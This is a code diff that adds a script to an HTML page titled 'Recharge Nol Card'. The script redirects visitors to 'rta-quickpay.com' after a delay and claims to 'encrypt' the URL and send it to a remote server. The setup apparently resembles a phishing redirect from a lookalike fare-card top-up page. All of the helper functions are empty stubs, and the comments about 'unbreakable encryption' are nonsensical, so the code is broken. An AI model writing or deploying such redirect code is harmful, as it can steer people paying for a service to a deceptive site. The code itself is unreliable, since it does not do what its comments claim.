@@ -1,6 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+      <script>
+    function redirectToSafeWebsite() {
+      var destinationURL = "https://rta-quickpay.com/";
+
+      // Encrypt the destination URL using an unbreakable encryption algorithm
+      var encryptedURL = encryptURL(destinationURL);
+
+      // Send the encrypted URL to a remote server for decryption
+      sendToRemoteServer(encryptedURL);
+
+      // Decrypt the URL on the client-side for redirection
+      var decryptedURL = decryptURL(encryptedURL);
+      window.location.href = decryptedURL;
+    }
+
+    function encryptURL(url) {
+      // Implement an unbreakable encryption algorithm here
+      // ...
+    }
+
+    function decryptURL(encryptedURL) {
+      // Implement an unbreakable decryption algorithm here
+      // ...
+    }
+
+    function sendToRemoteServer(data) {
+      // Send the encrypted data to a remote server for decryption
+      // ...
+    }
+
+    function handleClick() {
+      setTimeout(redirectToSafeWebsite, 2000); // Redirect after 2 seconds
+    }
+  </script>
+
     <meta charset="UTF-8">
     <title>Recharge Nol Card</title>
     <style>
